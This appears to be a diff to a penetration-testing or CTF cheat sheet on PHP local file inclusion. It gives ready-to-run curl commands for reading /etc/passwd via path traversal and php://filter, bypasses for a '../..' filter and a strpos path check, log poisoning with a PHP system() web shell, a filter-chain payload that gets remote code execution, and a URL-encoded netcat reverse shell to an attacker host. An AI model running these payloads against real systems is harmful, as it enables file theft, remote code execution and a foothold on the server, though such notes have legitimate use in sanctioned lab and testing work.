@@ -152,17 +152,45 @@ curl 'http://<target>/page.php?file=../../../../etc/passwd'
 # php://filter — direct read
 curl 'http://<target>/page.php?file=php://filter/resource=../../../../../etc/passwd'
 
-# php://filter — base64 encode (bypass output filters / read PHP source)
-curl -sk 'http://<target>/page.php?file=php://filter/convert.base64-encode/resource=<file>' | base64 -d
+# php://filter — base64 encode (bypass output filters / read PHP source without executing it)
+curl -sk 'http://<target>/page.php?file=php://filter/convert.base64-encode/resource=<file>' \
+  | grep -oP '[A-Za-z0-9+/=]{50,}' | head -1 | base64 -d
 
 # Log poisoning — poison User-Agent then include log
 curl -sk -A '<?php system($_GET["cmd"]); ?>' http://<target>/
 curl 'http://<target>/page.php?file=../../../../var/log/apache2/access.log&cmd=id'
 ```
 
+### LFI Filter Bypass — `../..` Blocked
+
+When a filter blocks the exact substring `../..` but the app still needs a path prefix:
+
+```bash
+# Replace every ../ with .././ — avoids the ../.. substring while still traversing up
+# Example: reading /etc/passwd when filter blocks ../.. and requires /var/www/html/app
+curl 'http://<target>/page.php?file=/var/www/html/app/.././.././.././../etc/passwd'
+
+# Alternative: pad with ./ between each ..
+curl 'http://<target>/page.php?file=/var/www/html/app/./../././../././../././etc/passwd'
+```
+
+Always use `php://filter/convert.base64-encode` first to read the PHP source and understand the exact filter rules before guessing traversal strings.
+
+### Vhost Discovery from Page Source
+
+```bash
+# Grep page source for email addresses — domain part often reveals hidden vhosts
+curl -s http://<target>/ | grep -iE 'href|mail|@' | grep -oP '[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}'
+
+# Add discovered vhost to /etc/hosts
+echo "<IP>  <vhost>" | sudo tee -a /etc/hosts
+```
+
 ### PHP Filter Chain — File-less RCE
 
 **Tool:** https://github.com/synacktiv/php_filter_chain_generator
+
+Generates arbitrary PHP code from iconv encoding artifacts — no log, no upload, no writable file needed. Requires only a working LFI `include`.
 
 ```bash
 # Generate chain
@@ -173,6 +201,22 @@ curl "http://<target>/vuln.php?file=${CHAIN}&cmd=id" --output -
 
 # Reverse shell
 curl "http://<target>/vuln.php?file=${CHAIN}&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<LHOST>%20<LPORT>%20%3E%2Ftmp%2Ff" --output -
+```
+
+**Path check bypass — `php://temp?<path>` trick**
+
+When the LFI filter requires a specific string in the `view` parameter (e.g. `strpos($view, '/var/www/html/app')`), the chain's `resource=php://temp` will be rejected because it doesn't contain the required path. Fix: append the required path as a query string on the temp stream. PHP ignores query strings on `php://` wrappers, so the chain still gets its empty input — but `strpos()` sees the required string and passes.
+
+```bash
+# Bypass: append required path as query string on php://temp
+CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
+  | tail -1 \
+  | sed 's|resource=php://temp|resource=php://temp?/var/www/html/app|')
+
+ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$CHAIN")
+CMD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "id")
+
+curl -s "http://<target>/vuln.php?view=${ENCODED}&cmd=${CMD}" | strings | grep -v "html\|head\|body"
 ```
 
 ---
